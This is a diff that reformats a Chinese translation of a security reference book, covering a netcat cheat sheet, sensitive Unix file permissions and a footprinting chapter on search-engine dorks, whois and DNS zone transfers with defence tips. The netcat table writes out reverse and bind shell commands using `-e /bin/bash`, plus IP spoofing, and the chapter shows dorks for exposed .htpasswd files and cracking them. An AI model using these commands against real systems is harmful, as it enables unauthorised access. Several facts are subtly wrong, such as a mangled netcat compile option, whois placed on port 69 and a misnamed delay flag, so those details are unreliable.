+| 连接到远程主机并提供 bash shell 服务 | `nc remote_ip <port> -e /bin/bash`<br>注意：Netcat 默认不支持 `-e` 标志。要使 Netcat 支持 `-e` 标志，必须使用 `D__SECURITY_HOLE` 选项重新编译 |
+| 监听端口并在连接时提供 bash shell 服务 | `nc -v -l -p <port> -e /bin/bash`<br>注意：Netcat 默认不支持 `-e` 标志。要使 Netcat 支持 `-e` 标志，必须使用 `DAGING_SECURITY_HOLE` 选项重新编译 |
+| 对远程主机进行端口扫描 | `nc -v -z remote_host <port>-<port>`<br>使用 `-l` 标志来设置延迟间隔：<br>`nc -i <seconds> -v -z remote_host <port>-<port>` |
+| 将命令输出通过传输到 netcat 请求 | `<command> | nc remote_host <port>`<br>例如：<br>`echo "GET / HTTP/1.0`[enter]`[enter]" | nc www.somecompanyanample.com 80` |
+| 使用源路由连接到远程主机上的端口 | `nc -g <gateway> remote_host <port>`<br>注意：可以使用 `-g` 标志指定最多八个高点。使用 `-G` 标志指定源路由指针 |
 
 ## 有用的 Netcat 命令
 
 | 描述 | 命令 |
 |---|---|
-| 伪造 IP 地址 | 使用 -s 标志伪造源 IP 地址：nc -s spoofed_ip remote_host port。此命令将导致远程主机响应伪造的 IP 地址。-s 标志可以与表所示的大多数命令一起使用。 |
-| 传输文件 | 在服务器主机上：nc -v -l -p <port> <file>\n在客户端主机上：nc -v <server_host> <port> <file>\n客户端主机也可以监听端口以接收文件。要实现这一点，请在客户端主机上运行以下命令：nc -v -l -p <port> > file\n然后在服务器主机上运行以下命令：nc -v <client_host> <port> < file |
+| 伪造 IP 地址 | 使用 `-s` 标志伪造源 IP 地址：`nc -s spoofed_ip remote_host port`。此命令将导致远程主机响应伪造的 IP 地址。`-s` 标志可以与表所示的大多数命令一起使用。 |
+| 传输文件 | 在服务器主机上：`nc -v -l -p <port> <file>`<br>在客户端主机上：`nc -v <server_host> <port> <file>`<br>客户端主机也可以监听端口以接收文件。要实现这一点，请在客户端主机上运行以下命令：`nc -v -l -p <port> > file`<br>然后在服务器主机上运行以下命令：`nc -v <client_host> <port> < file` |
 
-# ASCII 表
+## ASCII 表
 
 ASCII（美国信息交换标准代码）字符集包含 128 条目，由控制代码、字母、数字和标点符号组成。下表表示了十进制、十六进制和八进制表示的 ASCII 集合。
 
@@ -750,9 +828,6 @@ ASCII（美国信息交换标准代码）字符集包含 128 条目，由控制�
 | 18 | 12 | 022 | DC2 (设备控制 2) |
 | 19 | 13 | 023 | DC3 (设备控制 3) |
 | 20 | 14 | 024 | DC4 (设备控制 4) |
-
-| 十进制 | 十六进制 | 八进制 | 字符 |
-|---|---|---|---|
 | 21 | 15 | 025 | NAK (否定确认) |
 | 22 | 16 | 026 | SYN (同步) |
 | 23 | 17 | 027 | ETB (传输块结束) |
@@ -778,9 +853,6 @@ ASCII（美国信息交换标准代码）字符集包含 128 条目，由控制�
 | 43 | 2b | 053 | + |
 | 44 | 2c | 054 | , |
 | 45 | 2d | 055 | - |
-
-| 十进制 | 十六进制 | 八进制 | 字符 |
-|---|---|---|---|
 | 46 | 2e | 056 | / |
 | 47 | 2f | 057 | / |
 | 48 | 30 | 060 | 0 |
@@ -788,6 +860,11 @@ ASCII（美国信息交换标准代码）字符集包含 128 条目，由控制�
 | 50 | 32 | 062 | 2 |
 | 51 | 33 | 063 | 3 |
 | 52 | 34 | 064 | 4 |
+
+
+
+## ASCII 编码表
+
 | 53 | 35 | 065 | 5 |
 | 54 | 36 | 066 | 6 |
 | 55 | 37 | 067 | 7 |
@@ -898,10 +975,6 @@ HTTP 服务器对所有请求都返回一个 HTTP 代码。某些 HTTP 服务器
 | 403 | 禁止访问 |
 | 404 | 未找到 |
 
-
-
-
-
 ## HTTP 状态码 RC 29
 
 | 状态码 | 描述 |
@@ -934,62 +1007,90 @@ HTTP 服务器对所有请求都返回一个 HTTP 代码。某些 HTTP 服务器
 
 | 文件名 | 用户 | 组 | 权限 |
 |---|---|---|--|
-| /bin | root | root | drwx-xr-x |
-| /etc | root | root | drwx-xr-x |
-| /etc/aliases | root | root | -rw-r--r-- |
-| /etc/default/login | root | root | -rw----r-- |
-| /etc/exports | root | root | -rw-r--r-- |
-| /etc/hosts | root | root | -rw-r--r-- |
-| /etc/hosts.allow | root | root | -rw------ |
-| /etc/hosts.deny | root | root | -rw------ |
-| /etc/hosts.equiv | root | root | -rw------ |
-| /etc/hosts.lpd | root | root | -rw------ |
-| /etc/inetd.conf | root | root | -rw------ |
-| /etc/issue | root | root | -rw-r--r-- |
-| /etc/login.conf | root | root | -rw------ |
-| /etc/login.access | root | root | -rw------ |
-| /etc/login.defs | root | root | -rw------ |
-| /etc/motd | root | root | -rw-r--r-- |
-| /etc/rmtab | root | root | -rw-r--r-- |
-| /etc/netgroup | root | root | -rw------ |
-| /etc/passwd | root | root | -rw-r--r-- |
-| /etc/rc.d | root | root | drwx------ |
-| /etc/rc.local | root | root | -rw------ |
-| /etc/rc.sysinit | root | root | -rw------ |
-| /etc/secty | root | root | -rw------ |
-| /etc/security | root | root | -rw------ |
+| `/bin` | root | root | drwx-xr-x |
+| `/etc` | root | root | drwx-xr-x |
+| `/etc/aliases` | root | root | -rw-r--r-- |
+| `/etc/default/login` | root | root | -rw----r-- |
+| `/etc/exports` | root | root | -rw-r--r-- |
+| `/etc/hosts` | root | root | -rw-r--r-- |
+| `/etc/hosts.allow` | root | root | -rw------ |
+| `/etc/hosts.deny` | root | root | -rw------ |
+| `/etc/hosts.equiv` | root | root | -rw------ |
+| `/etc/hosts.lpd` | root | root | -rw------ |
+| `/etc/inetd.conf` | root | root | -rw------ |
+| `/etc/issue` | root | root | -rw-r--r-- |
+| `/etc/login.conf` | root | root | -rw------ |
+| `/etc/login.access` | root | root | -rw------ |
+| `/etc/login.defs` | root | root | -rw------ |
+| `/etc/motd` | root | root | -rw-r--r-- |
+| `/etc/rmtab` | root | root | -rw-r--r-- |
+| `/etc/netgroup` | root | root | -rw------ |
+| `/etc/passwd` | root | root | -rw-r--r-- |
+| `/etc/rc.d` | root | root | drwx------ |
+| `/etc/rc.local` | root | root | -rw------ |
+| `/etc/rc.sysinit` | root | root | -rw------ |
+| `/etc/secty` | root | root | -rw------ |
+| `/etc/security` | root | root | -rw------ |
 
 ## 重要文件 RC 31
 
 | 文件名 | 用户 | 组 | 权限 |
 | --- | --- | --- | --- |
-| /etc/services | root | root | -rw-r--r-- |
-| /etc/shadow | root | root | -r-------- - - |
-| /etc/ssh/ssh_host_key | root | root | -rw-r------ |
-| /etc/ssh/sshd_config | root | root | -rw------- - |
-| /etc/ssh/sshd_dsa_key | root | root | -rw-r------ |
-| /etc/ssh/vsh_host_key | root | root | -rw-r------ |
-| /etc/ssh/ssh_host_rsa_key | root | root | -rw-r------ |
-| /etc/ttys | root | root | -rw-r---- |
-| /root | root | root | drwx------ |
-| /sbin | root | root | drxr-xr-x |
-| /tmp | root | root | drwxrwxrwt |
-| /usr/bin | root | root | drxr-xr-x |
-| /usr/etc | root | root | drxr-xr-x |
-| /usr/sbin | root | root | drxr-xr-x |
-| /var/log | root | root | drwxr-xr-x |
-| /var/log/authlog* | root | root | -rw-r--r-- - - |
-| /var/log/boot* | root | root | -rw-r---- |
-| /var/log/cron* | root | root | -rw-r---- |
-| /var/log/dmesg* | root | root | -rw-r---- |
-| /var/log/lastlog* | root | root | -rw-r---- |
-| /var/log/maillog* | root | root | -rw-r---- |
-| /var/log/messages* | root | root | -rw-r---- |
-| /var/log/secure* | root | root | -rw------- |
-| /var/log/spooler* | root | root | -rw------- |
-| /var/log/syslog* | root | root | -rw------- |
-| /var/log/utmp* | root | utmp | -rw-rw-r-- - - |
-| /var/log/wtmp* | root | utmp | -rw-rw-r-- - - |
+| `/etc/services` | root | root | -rw-r--r-- |
+
+
+
+| `/etc/shadow` | root | root | -r-------- - - |
+
+| `/etc/ssh/ssh_host_key` | root | root | -rw-r------ |
+
+| `/etc/ssh/sshd_config` | root | root | -rw------- - |
+
+| `/etc/ssh/sshd_dsa_key` | root | root | -rw-r------ |
+
+| `/etc/ssh/vsh_host_key` | root | root | -rw-r------ |
+
+| `/etc/ssh/ssh_host_rsa_key` | root | root | -rw-r------ |
+
+| `/etc/ttys` | root | root | -rw-r---- |
+
+| `/root` | root | root | drwx------ |
+
+| `/sbin` | root | root | drxr-xr-x |
+
+| `/tmp` | root | root | drwxrwxrwt |
+
+| `/usr/bin` | root | root | drxr-xr-x |
+
+| `/usr/etc` | root | root | drxr-xr-x |
+
+| `/usr/sbin` | root | root | drxr-xr-x |
+
+| `/var/log` | root | root | drwxr-xr-x |
+
+| `/var/log/authlog*` | root | root | -rw-r--r-- - - |
+
+| `/var/log/boot*` | root | root | -rw-r---- |
+
+| `/var/log/cron*` | root | root | -rw-r---- |
+
+| `/var/log/dmesg*` | root | root | -rw-r---- |
+
+| `/var/log/lastlog*` | root | root | -rw-r---- |
+
+| `/var/log/maillog*` | root | root | -rw-r---- |
+
+| `/var/log/messages*` | root | root | -rw-r---- |
+
+| `/var/log/secure*` | root | root | -rw------- |
+
+| `/var/log/spooler*` | root | root | -rw------- |
+
+| `/var/log/syslog*` | root | root | -rw------- |
+
+| `/var/log/utmp*` | root | utmp | -rw-rw-r-- - - |
+
+| `/var/log/wtmp*` | root | utmp | -rw-rw-r-- - - |
 
 参考重要文件
 
@@ -997,29 +1098,35 @@ HTTP 服务器对所有请求都返回一个 HTTP 代码。某些 HTTP 服务器
 
 | 文件名 | 用户 | 组 | 权限 |
 | --- | --- | --- | --- |
-| /var/log/xferlog | root | root | -rw------- |
-| /var/run | root | root | drwx-xr-x |
-| /var/run/"*.pid | root | root | -rw-r-- |
-| /var/spool/cron | root | root | drwx------ |
-| /var/spool/cron/crontabs/ | root | root | -r------- |
-| /var/spool/mail | root | mail | drwxrwxr-x |
-| /var/spool/mail/* | user | user | -rw-rw-- |
-| /var/tmp | root | root | drwxrwx |
+| `/var/log/xferlog` | root | root | -rw------- |
+| `/var/run` | root | root | drwx-xr-x |
+| `/var/run/"*.pid` | root | root | -rw-r-- |
+| `/var/spool/cron` | root | root | drwx------ |
+| `/var/spool/cron/crontabs/` | root | root | -r------- |
+| `/var/spool/mail` | root | mail | drwxrwxr-x |
+| `/var/spool/mail/*` | user | user | -rw-rw-- |
+| `/var/tmp` | root | root | drwxrwx |
 
-第一部分：攻击与防御
+# 第一部分：攻击与防御
 
-- 第1章 指纹识别
-- 第2章 扫描与识别
-- 第3章 枚举
-- 第4章 远程攻击
-- 第5章 权限提升
-- 第6章 隐藏
+## 第1章 指纹识别
+
+## 第2章 扫描与识别
+
+## 第3章 枚举
+
+## 第4章 远程攻击
+
+## 第5章 权限提升
+
+## 第6章 隐藏
 
 本页特留
 
 # 第1章 指纹识别
 
 在本章：
+
 - 搜索引擎
 - 域名注册商
 - 区域注册局
@@ -1037,15 +1144,15 @@ HTTP 服务器对所有请求都返回一个 HTTP 代码。某些 HTTP 服务器
 
 ### 寻找漏洞
 
-许多公司发布职位，可以提供大量关于安全状况的信息。例如，如果一家公司正在积极招聘，他们的防火墙配置可能很弱，这一事实为黑客提供了更多关注方向。诸如 http://www.monster.com/ 等服务已知可以寻找此类信息。
+许多公司发布职位，可以提供大量关于安全状况的信息。例如，如果一家公司正在积极招聘，他们的防火墙配置可能很弱，这一事实为黑客提供了更多关注方向。诸如 `http://www.monster.com/` 等服务已知可以寻找此类信息。
 
 ### 搜索 EDGAR
 
-EDGAR（电子数据收集、分析和检索）数据库包含上市公司的信息。收购等细节特别受关注，因为大型组织在管理网络安全方面往往存在问题。EDGAR 数据库还可以被潜在入侵者用于收集组织的季度和年度报告。EDGAR 系统位于 http://www.sec.gov/edgar.shtml。
+`EDGAR`（电子数据收集、分析和检索）数据库包含上市公司的信息。收购等细节特别受关注，因为大型组织在管理网络安全方面往往存在问题。`EDGAR` 数据库还可以被潜在入侵者用于收集组织的季度和年度报告。`EDGAR` 系统位于 `http://www.sec.gov/edgar.shtml`。
 
 # 第1章 指纹识别 查找日志文件的敏感性
 
-许多程序写入特定的日志文件。有时，这些文件被意外放在 Web 服务器的根目录下。例如，在 http://www.google.com/ 上进行如“Index of dead letter”的查询将提供指向死信文件的链接（见图1-1）。注意，死信是在用户发送邮件时创建的，可能包含邮件内容。此文件与其他日志文件可能向潜在入侵者提供关键机密。
+许多程序写入特定的日志文件。有时，这些文件被意外放在 Web 服务器的根目录下。例如，在 `http://www.google.com/` 上进行如“Index of dead letter”的查询将提供指向死信文件的链接（见图1-1）。注意，死信是在用户发送邮件时创建的，可能包含邮件内容。此文件与其他日志文件可能向潜在入侵者提供关键机密。
 
 搜索引擎
 
@@ -1058,19 +1165,22 @@ John,
 Eric,
 
 2003年1月12日星期日 webmaster@somecompany.com 写道：
+
 > 亲爱的 Eric，
+> 
 > 你能重置我的账号 (john) 吗？我不记得了。
+> 
 > 谢谢。John。
 
 图1-1. Web 服务器提供的用户 dead.letter 文件内容
 
 第一部分：攻击与防御
 
-还有许多其他已知日志文件可以搜索。示例包括 syslog、maillog、spooler、messages、access_log 和 error_log。
+还有许多其他已知日志文件可以搜索。示例包括 `syslog`、`maillog`、`spooler`、`messages`、`access_log` 和 `error_log`。
 
 ### 搜索 Web 服务器统计
 
-各种 Web 应用用于向管理员提供流量统计。流量统计大多受密码保护，并包含 URL。搜索引擎可以发现提供此类数据的错误配置主机。例如，在 http://www.google.com/ 上搜索如“Index of stats”可能会暴露错误配置为无人实体提供统计信息的 Web 服务器位置（见图1-2）。
+各种 Web 应用用于向管理员提供流量统计。流量统计大多受密码保护，并包含 URL。搜索引擎可以发现提供此类数据的错误配置主机。例如，在 `http://www.google.com/` 上搜索如“Index of stats”可能会暴露错误配置为无人实体提供统计信息的 Web 服务器位置（见图1-2）。
 
 ![](img/17cb132e6294dc7f5e0ead90c71f51_60_0.png)
 
@@ -1087,15 +1197,11 @@ Eric,
 
 **图1-2.** Web 统计数据由 somecompanyexample.com 向全球提供。
 
-
-
-
-
 ### 定位受保护的数据资源
 
 敏感信息通常存放在网站上名为“protected”、“secret”、“passwords”等的目录中。很多时候，这些目录并没有经过密码保护，可以被轻易搜索到。
 
-例如，Apache Web 服务器通常配置为当目录中存在某些配置和密码文件时提供身份验证。名为 `.htpasswd` 的密码文件不应由 Web 服务器提供。若要在互联网 http://www.google.com 上搜索此类文件，请执行以下查询：““Index of” .htpasswd。以下是一个 `.htpasswd` 文件的示例：
+例如，Apache Web 服务器通常配置为当目录中存在某些配置和密码文件时提供身份验证。名为 `.htpasswd` 的密码文件不应由 Web 服务器提供。若要在互联网 `http://www.google.com` 上搜索此类文件，请执行以下查询：““Index of” .htpasswd。以下是一个 `.htpasswd` 文件的示例：
 
 ```
 joe:1WJdcijCqWFA
@@ -1106,6 +1212,8 @@ admin:XrouH05qTM1U.
 ```
 
 此文件中包含的密码哈希可以使用“John the Ripper”之类的密码破解器轻松破解。
+
+
 
 ```bash
 [bash]$ john .htpasswd
@@ -1119,7 +1227,7 @@ John the Ripper 可以在 http://www.openwall.com/john/ 获取。
 
 ### 遍历配置文件查找敏感信息
 
-包含密码、密钥、用户名、内部 IP 地址和其他敏感数据的各种配置文件，在被放置在 Web 目录中时，会被各种服务器错误地发布。搜索这些文件的关键在于知道它们的名称。一个潜在的漏洞文件是 `ssh_config`，它包含了 SSH 服务器的配置信息。潜在的入侵者可能会使用查询语句“Index of” ssh_config 进行搜索，以找到提供 `ssh_config` 文件的 Web 服务器。由于配置文件包含敏感信息，它们可能会暴露外部实体不应访问的关键信息。
+包含密码、密钥、用户名、内部 IP 地址和其他敏感数据的各种配置文件，在被放置在 Web 目录中时，会被各种服务器错误地发布。搜索这些文件的关键在于知道它们的名称。一个潜在的漏洞文件是 `ssh_config`，它包含了 SSH 服务器的配置信息。潜在的入侵者可能会使用查询语句“Index of” `ssh_config` 进行搜索，以找到提供 `ssh_config` 文件的 Web 服务器。由于配置文件包含敏感信息，它们可能会暴露外部实体不应访问的关键信息。
 
 ### 搜索 Usenet 存档查找管理缺陷
 
@@ -1130,8 +1238,8 @@ John the Ripper 可以在 http://www.openwall.com/john/ 获取。
 强烈建议执行以下防御策略，以最大限度地减少与搜索引擎暴露和 Web 服务器配置错误相关的敏感信息风险：
 
 - 不要以可能暴露与安全相关的管理弱点的方式发布职位空缺。
-
 - 对你的 Web 服务器配置及其允许提供的数据进行审计是一个好主意。如果你有 Web 服务器本身的访问权限，则可以在 Web 根目录内部搜索特定信息。例如，以下命令将列出包含“log”单词的文件：
+
 `ls -aR /var/web-root/html | grep log`
 
 静态数据中的内容也可以被搜索。若要在 Web 根目录包含的文件内容搜索特定单词（例如“password”）：
@@ -1140,27 +1248,26 @@ John the Ripper 可以在 http://www.openwall.com/john/ 获取。
 grep -R password /var/web-root
 ```
 
-在无法本地访问 Web 服务器文件系统的情况下，`wget` 是一个很好的命令行工具，可以用于镜像网站。一旦完成，就可以像上面建议的那样对数据进行 greps 操作。`wget` 的用法示例：
+在无法本地访问 Web 服务器文件系统的情况下，`wget` 是一个很好的命令行工具，可以用于镜像网站。一旦完成，就可以像上面建议的那样对数据进行 `greps` 操作。`wget` 的用法示例：
 
 ```bash
 wget -m -np http://www.somecompanyasexample.com/
 ```
 
 `wget` 工具可以在 http://wget.sunsite.dk 获取。
-
 - 必须指示管理员使用其真实姓名和电子邮件地址在技术新闻组和公告板上发布职位空缺。
 
 ## 域名注册商
 
-一个组织可能在不同位置拥有许多网络。通过执行“whois”查询，可以发现与特定组织相关的域名。大多数域名注册商都有关联的公共 whois 服务器（监听在端口 69），客户端可以连接到该服务器以查询域名所有者的信息。域名 whois 查询返回的信息包括关联的 POC 和 DNS IP 地址，这些对于确定目标的网络存在非常有用。
+一个组织可能在不同位置拥有许多网络。通过执行 `whois` 查询，可以发现与特定组织相关的域名。大多数域名注册商都有关联的公共 `whois` 服务器（监听在端口 69），客户端可以连接到该服务器以查询域名所有者的信息。域名 `whois` 查询返回的信息包括关联的 POC 和 DNS IP 地址，这些对于确定目标的网络存在非常有用。
 
-由于域名可以通过许多注册商进行注册，因此你必须先查询域名是在哪个注册商处注册的，然后从关联的注册商查询域名记录。为了查询到正确的注册商，必须在公共 whois 服务器 **whois.crsnic.net** 上执行查询。
+由于域名可以通过许多注册商进行注册，因此你必须先查询域名是在哪个注册商处注册的，然后从关联的注册商查询域名记录。为了查询到正确的注册商，必须在公共 `whois` 服务器 `whois.crsnic.net` 上执行查询。
 
-许多注册商限制了后续章节中提到的查询类型。如果以下任何一个查询没有从特定 whois 服务器获得积极响应，那么它们只需在另一个注册商的 whois 服务器上运行即可。
+许多注册商限制了后续章节中提到的查询类型。如果以下任何一个查询没有从特定 `whois` 服务器获得积极响应，那么它们只需在另一个注册商的 `whois` 服务器上运行即可。
 
 ### 通过域名查询域名注册商记录
 
-要查询 **somecompanyanexample.com**，你必须使用命令行 whois 工具（Unix 和 Linux 发行版自带）在 **whois.crsnic.net** 上运行 whois 查询，如下所示：
+要查询 `somecompanyanexample.com`，你必须使用命令行 `whois` 工具（Unix 和 Linux 发行版自带）在 `whois.crsnic.net` 上运行 `whois` 查询，如下所示：
 
 ```bash
 [bash]$ whois -h whois.crsnic.net somecompanyanexample.com
@@ -1172,16 +1279,22 @@ Whois Server Version 1.3
 .com、.net 和 .org 域名的域名现在可以在许多不同的竞争注册商处注册。访问 http://www.internet.net 获取详细信息。
 
 Domain Name: SOMECOMPANYASANEXAMPLE.COM
+
 Registrar: SOME REGISTRAR, INC.
+
 Whois Server: somewhoisserver.com
+
 Referral URL: http://www.someregistrarasanexample.com
+
 NS Server: NS1.SOMEEXAMPLESERVER.NET
+
 NS Server: NS2.SOMEEXAMPLESERVER.NET
+
 Updated: 05-nov-2001
 
 >>> Last update of whois database: Sat, 11 Jan 2003 17:11:52 EST <<<
 
-上述查询将返回域名注册的实际注册商及其 whois 服务器。在我们之前的示例中，**somecompanyanexample.com** 注册商的 whois 服务器是 whois.somewhoisserver.com。现在，我们必须查询 whois.somewhoisserver.com。
+上述查询将返回域名注册的实际注册商及其 `whois` 服务器。在我们之前的示例中，`somecompanyanexample.com` 注册商的 `whois` 服务器是 `whois.somewhoisserver.com`。现在，我们必须查询 `whois.somewhoisserver.com`。
 
 ```bash
 $bash whois -h whois.somewhoisserver.com somecompanyasanexample.com
@@ -1190,20 +1303,31 @@ NOTICE AND WARNING BANNER HERE
 ```
 
 Registrant:
+
 Lname, Fname (SOMEHANDLE) username@somecompanyasanexample.com
+
 1234 Some St.
+
 Somecity, SOMESTATE 99999
+
 SOME COUNTRY
 
 Domain Name: somecompanyasanexample.com
 
 Administrative Contact, Technical Contact:
+
 Lname2, Fname2 (SOMEHANDLE2) username2@somecompanyasanexample.com
+
 5678 Some St.
+
 Somecity, SOMESTATE 99999
+
 SOME COUNTRY
+
 (123)456-7890Record expires on 31-12-2004
+
 Record created on 31-12-2002
+
 Database last updated on 12-Jan-2003 03:44:29 EST.
 
 域名服务器如下：
@@ -1225,8 +1349,11 @@ Whois version 1.x
 NOTICE AND WARNING BANNER HERE
 
 SOMECOMPANY.COM
+
 SOMECOMPANY.ORG
+
 SOMECOMPANYASANEXAMPLE.COM
+
 SOMECOMPANYTHATESNOTEXIST.COM
 
 要提取特定记录，请查询“xxx”，其中 xxx 是列表中显示之一。如果记录相同，请使用 "=xxx”查询以获取完整显示。
@@ -1235,7 +1362,7 @@ SOMECOMPANYTHATESNOTEXIST.COM
 
 ### 通过 Handle 查询域名注册商记录
 
-列在 whois 服务器上的个人通常关联有一个 handle。你可以查询特定的 handle 以找到相关的联系信息：
+列在 `whois` 服务器上的个人通常关联有一个 `handle`。你可以查询特定的 `handle` 以找到相关的联系信息：
 
 ```bash
 $bash$ whois -h whois.somewhoisserver.com "handle HANDLE"
@@ -1244,13 +1371,18 @@ NOTICE AND WARNING BANNER HERE
 ```
 
 Lastname, FirstName (SOMEHANDLE) username@somecompanyexample.com
+
 1234 Some
+
 Somecity, SOMESTATE 99999
+
 SOME COUNTRY
 
 Database last updated on 12-Jan-2003 03:44:29 EST.
 
 ### 通过电子邮件查询域名注册商记录
+
+
 
 列在 whois 服务器上的个人通常关联有一个电子邮件地址。可以通过提供完整的电子邮件地址或其部分来搜索用户。因此，查询
 
@@ -1258,19 +1390,15 @@ Database last updated on 12-Jan-2003 03:44:29 EST.
 whois -h whois.somewhoisserver.com "@somecompanyasanexample.com"
 ```
 
-将返回包含 @somecompanyasanexample.com 域名的记录个人。
+将返回包含 `@somecompanyasanexample.com` 域名的记录个人。
 
 ### 防止由于域名注册商记录导致的暴露
 
 确保列在 whois 记录中的电子邮件地址以与组织名称不同的域名结尾。这将他人通过电子邮件查询你的记录变得困难。此外，一些域名注册商提供将他们的联系信息放在 whois 记录中，而不是你的个人联系信息。利用这个选项是一个好主意，可以防止你的个人联系信息暴露给潜在的入侵者。
 
-
-
-
-
 ## 区域互联网注册机构
 
-与域名类似，组织可以分配到 IP 地址块。可路由的 IP 地址由四个主要的区域互联网注册机构（RIR）分配给组织，如表 1-1 所示。表 1-1 包含了四个主要 RIR 的列表。然而，新的 RIR 计划在不久后建立。详细信息和更新请参阅 http://www.asoann.org/。许多注册者限制了后续章节中提到的查询类型。如果后续的任何查询都没有从特定服务器获得积极响应，它们可能是针对另一个注册者的。
+与域名类似，组织可以分配到 IP 地址块。可路由的 IP 地址由四个主要的区域互联网注册机构（RIR）分配给组织，如表 1-1 所示。表 1-1 包含了四个主要 RIR 的列表。然而，新的 RIR 计划在不久后建立。详细信息和更新请参阅 `http://www.asoann.org/`。许多注册者限制了后续章节中提到的查询类型。如果后续的任何查询都没有从特定服务器获得积极响应，它们可能是针对另一个注册者的。
 
 ### 通过公司前缀查询 RIR 记录
 
@@ -1281,11 +1409,12 @@ whois -h whois.somewhoisserver.com "@somecompanyasanexample.com"
 搜索以 "somecompany" 开头的 RIR 记录：
 
 ```bash
-[bash] whois -h whois.whoisser.net "somecompanyasexample"
+whois -h whois.whoisser.net "somecompanyasexample"
 示例公司 (SOMEC)
 示例公司 (SOMECA)
 
 ### RIR Whois 数据库，最后更新于 2003-01-11 01:00
+```
 
 | 名称 | Whois 服务器 | 区域 |
 | --- | --- | --- |
@@ -1302,33 +1431,53 @@ whois -h whois.somewhoisserver.com "@somecompanyasanexample.com"
 
 `whois -h whoisser.net ipaddressblock`
 
-192.168.1.0/24 地址属于一个不可路由的 IP 地址块。关于不可路由 IP 范围的更多信息，请参阅位于 http://www.faqs.org/rfc/rfc1918.html 的 RFC 1918。假设 192.168.1.0/24 是我们示例的有效路由 IP 范围。如果在 whois.arin.net 上搜索此块，我们需要尝试如下查询：
+`192.168.1.0/24` 地址属于一个不可路由的 IP 地址块。关于不可路由 IP 范围的更多信息，请参阅位于 `http://www.faqs.org/rfc/rfc1918.html` 的 RFC 1918。假设 `192.168.1.0/24` 是我们示例的有效路由 IP 范围。如果在 `whois.arin.net` 上搜索此块，我们需要尝试如下查询：
 
 ```bash
-[bash]$whois -h whois.arin.net 192.168.1.0
+$ whois -h whois.arin.net 192.168.1.0
+
 arin.net
+
 组织名称: 互联网地址分配机构 (IANA)
+
 组织 ID: IANA
+
 网络范围: 192.168.0.0 - 192.168.255
+
 CIDR: 192.168.0.0/16
+
 网络名称: IANA-SPECIAL
+
 网络句柄: NET-192-0-8-1
+
 父级: NET-0-0-0-0
+
 网络类型: IANA 特殊用途
+
 名称服务器: BLACKHOLE-1.IANA.ORG
+
 名称服务器: BLACKHOLE-2.IANA.ORG
+
 注释: 此块留作特殊用途。
+
 更多信息请参阅 RFC 1918。
+
 注册日期: 1994-03-15
+
 更新日期: 2002-09-16
+
 技术句柄: ARIN-IANA
+
 技术名称: 互联网分配名称与数字公司
+
 技术电话: +1-234-567-8900
+
 技术邮箱: res-ip@iana.org
 ```
 
 ```bash
 ### ARIN Whois 数据库，最后更新于 2003-01-12 20:00
+
 ### 输入 ? 获取关于搜索 ARIN Whois 数据库的额外提示。
 ```
 
@@ -1342,18 +1491,25 @@ whois -h whoisserver.com "HANDLE"
 
 # 14 第一部分：黑客技术与防御
 
-为了搜索 Some-Company-As-An-Example 的句柄 (SOMECA)，我们将执行以下操作：
+为了搜索 Some-Company-As-An-Example 的句柄 (`SOMECA`)，我们将执行以下操作：
 
 ```bash
-[bash]$ whois -h whoisserver.net "SOMECA"
+$ whois -h whoisserver.net "SOMECA"
+
 [whois.whoisserver.net]
 
 组织名称: Some Company As An Example
+
 组织 ID: SOMECA
+
 地址: 1234 Some St.
+
 国家: SOME COUNTRY
+
 注释:
+
 注册日期: 1998-08-01
+
 更新日期: 1998-08-01
 
 ### RIR Whois 数据库，最后更新于 2003-01-11 00:00
@@ -1361,14 +1517,19 @@ whois -h whoisserver.com "HANDLE"
 
 ### 通过电子邮件查询 RIR 记录
 
-列在 whois 服务器上的个人通常有一个关联的电子邮件地址。可以通过提供完整的电子邮件地址或其部分内容来搜索用户。因此，以下查询将返回电子邮件地址包含 @somecompanyasanexample.com 域名的个人姓名：
+列在 whois 服务器上的个人通常有一个关联的电子邮件地址。可以通过提供完整的电子邮件地址或其部分内容来搜索用户。因此，以下查询将返回电子邮件地址包含 `@somecompanyasanexample.com` 域名的个人姓名：
 
 ```bash
-[bash]$ whois -h whoisserver.net "@somecompanyasanexample.com"
+$ whois -h whoisserver.net "@somecompanyasanexample.com"
+
 [whois.whoisserver.net]
+
 username@somecompanyexample.com
+
 (123)456-7890
+
 #IR Whois 数据库，最后更新于 2003-01-11 00:00
+```
 
 ### 防止由于 RIR 记录导致的泄露
 
@@ -1383,7 +1544,7 @@ DNS 反向查询是指向 DNS 服务器查询与 IP 地址关联的主机名。
 可以使用 `host` 命令执行反向查询：
 
 ```bash
-[bash]$ host 10.0.0.3
+$ host 10.0.0.3
 ```
 
 这种查询不仅告诉我们主机名，还泄露了不应公开的信息。可以采取以下预防措施来减少此类暴露：
@@ -1396,7 +1557,7 @@ DNS 反向查询是指向 DNS 服务器查询与 IP 地址关联的主机名。
 要查找组织邮件服务器的主机名和 IP 地址，可以使用命令行工具 `dig`：
 
 ```bash
-[bash]$ dig mx somecompanyasanexample.com
+$ dig mx somecompanyasanexample.com
 ;;HEADER-- opcode: QUERY, status: NOERROR, id: 1234
 ;; flags: qr aa ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
 
@@ -1421,16 +1582,13 @@ DNS 服务器通常被配置为主服务器或从服务器。这种方法是为�
 例如：
 
 ```bash
-[bash]$ host -l somecompanyanyexample.com 10.0.0.1
+$ host -l somecompanyanyexample.com 10.0.0.1
 Using domain server:
 Name: 10.0.0.1
 ```
 
-
-
-
-
 地址：10.0.0.1#53
+
 别名：
 
 ```
@@ -1439,6 +1597,8 @@ somecompanyasanexample.net SOA ns1.someexampleserver.net.
 Name: 10.0.0.1
 Address: 10.0.0.1#53
 ```
+
+
 
 ```
 somecompanyasanexample.net name server ns1.someexampleserver.net.
@@ -1496,12 +1656,13 @@ payroll.somecompanyasanexample.com has address 192.168.1.33
 # 18 部分 I：攻击技术与防御
 
 使用域名服务器：
-Name: 10.0.0.1
-Address: 10.0.0.1#53
+Name: `10.0.0.1`
+Address: `10.0.0.1#53`
 
 从这个例子可以明显看出，如果入侵者成功执行了区域传输，他或她就可以获得有关组织内主机角色及其 IP 地址的信息。
 
 ### 防止区域传输滥用
+
 为了防止区域传输滥用，强烈建议采取以下措施：
 
 - 不要允许未经授权的主机从你的 DNS 执行区域传输。
@@ -1513,6 +1674,7 @@ Address: 10.0.0.1#53
 借助前面的查询，只需知道目标组织的名称即可获取 IP 地址。由于 IP 数据包通过不同的路径到达目的地，因此了解源主机（你自己）和目的主机之间的网关将是有益的。
 
 ### 执行路由追踪
+
